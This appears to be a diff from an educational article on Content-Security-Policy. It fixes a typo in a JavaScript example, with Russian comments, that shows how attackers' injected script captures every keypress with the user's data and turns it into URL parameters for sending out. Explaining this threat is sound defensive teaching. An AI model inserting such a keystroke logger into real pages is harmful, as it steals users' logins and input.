@@ -205,7 +205,7 @@ Content-Security-Policy: default-src 'self' *.trusted.com
 document.body.addEventListener("keypress", (e) => {
   // ...Злоумышленники собираются все данные о пользователе,
   // которые им нужны: логин, время события, что угодно.
-  const data = { ...user, key: e.key }=
+  const data = { ...user, key: e.key }
 
   // ...Переводят все данные в строку:
   const params = new URLSearchParams()
